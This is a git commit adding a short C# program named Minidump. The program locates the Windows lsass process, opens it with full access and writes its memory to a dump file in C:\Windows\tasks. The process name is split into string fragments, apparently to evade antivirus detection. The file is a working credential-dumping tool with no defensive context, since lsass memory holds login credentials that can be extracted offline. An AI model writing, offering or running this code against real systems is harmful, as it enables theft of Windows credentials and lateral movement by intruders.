3df36a39c0c8e1d8595156f72a3c40ea06866394
relwarc17 <28979675+Relwarc17@users.noreply.github.com>
2024-11-02 19:10:21 +0100

    Initial commit

---
+++ Minidump/Program.cs
@@ -0,0 +1,31 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace Minidump
+{
+    internal class Program
+    {
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam,
+            IntPtr UserStreamParam, IntPtr CallbackParam);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+        static void Main(string[] args)
+        {
+            
+            String l_n = "l" + "sa" + "ss";
+            Process[] l = Process.GetProcessesByName(l_n);
+            int l_p = l[0].Id;
+
+            IntPtr h = OpenProcess(0x001F0FFF, false, l_p);
+
+            FileStream dF = new FileStream("C:\\Windows\\tasks\\rtsd12.dmp", FileMode.Create);
+
+            MiniDumpWriteDump(h, l_p, dF.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+
+        }
+    }
+}
